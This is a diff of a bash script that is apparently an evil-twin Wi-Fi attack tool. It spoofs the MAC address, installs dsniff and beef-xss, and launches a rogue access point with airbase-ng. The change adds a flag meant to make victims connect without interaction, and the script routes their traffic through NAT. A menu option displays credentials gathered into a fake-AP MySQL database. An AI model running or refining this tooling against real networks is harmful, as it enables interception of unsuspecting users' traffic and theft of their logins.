@@ -30,6 +30,7 @@ mkdir /var/ $NULL
 mkdir /var/www/ $NULL
 mkdir /var/www/html $NULL
 clear
+
 ##################################################################################################
 
 # Section displays user ip then asks for ip-input, checks if user is running program as root, then installs needed packages and updates system.
@@ -41,7 +42,7 @@ if [ $(id -u) == 0 ] ; then
 	echo "${yellow}Congrats you're in root, Script can go on ... "
 	sleep $DELAY
 else 
-	echo "${red}Please run again as root"
+	echo "${red}Please run again as root${resetColor}"
 	exit
 fi
 read -p "${red}Is it okay if I install what the script needs to run [y/n]${resetColor} : " RUN
@@ -50,6 +51,7 @@ if [ $RUN == y ]; then
 	apt install macchanger -y 
 	apt install dsniff -y
 	apt install beef-xss -y
+	apt install php5-mysql -y 
 	apt install gnome-terminal -y
 	clear
 fi
@@ -115,6 +117,7 @@ echo "Changing MAC ... "
 	ifconfig $INTERFACE up
 	sleep 2
 clear
+
 ##################################################################################################
 
 # Section promts user for menu selection 
@@ -237,10 +240,9 @@ while [[ $(id -u) == 0 ]] ; do
 			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
 			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
 			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON				# starts evil-twin accesspoint, with the user provided information 
+			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL -P $INTERFACE$MON				# starts evil-twin accesspoint, with the user provided information. -P increases the chances of the user connecting to AP without interaction 
 			sleep 5 
 			gnome-terminal -x ifconfig at0 10.0.0.1 up 														# airbase will create network device 'at0' this line brings up the interface and acts as the gateway for the client when they connnect
-			
 			echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"								# iptables rules are configured to allow internet access to the connected client, allowing traffic in through at0 and out through eth0
 			sleep $DELAY
 			if [[ 1 == 1 ]] ; then																	
@@ -309,7 +311,7 @@ while [[ $(id -u) == 0 ]] ; do
 			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
 			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
 			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
+			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL -P $INTERFACE$MON 
 			sleep 5 
 			gnome-terminal -x ifconfig at0 10.0.0.1 up 
 			
@@ -353,7 +355,7 @@ while [[ $(id -u) == 0 ]] ; do
 ##################################################################################################
 
 		if [ $CHOICE == 7 ] ; then
-			mysql -u fakeap -p < SQL-Display.sql
+			mysql -u fakeap -p < SQL-Display.sql					# Displays the contents of the SQL database setup in option 4, with the setup username. User enters password
 			sleep 5 
 		fi
 
@@ -362,7 +364,7 @@ while [[ $(id -u) == 0 ]] ; do
 # Section reverts the changes made to the network adapter that was put into monitor mode, restarts network manager, flushes iptables and prompts user to purge the handshakes directory as it clutters fast.
 
 		if [[ $CHOICE == 8 ]] ; then 
-			echo "Cleaning up ... "
+			echo "Cleaning up ... " 						# Find way to input ctrl + c to skip to this 
 			airmon-ng stop $INTERFACE$MON $NULL
 			ifconfig $INTERFACE up $NULL
 			service network-manager restart
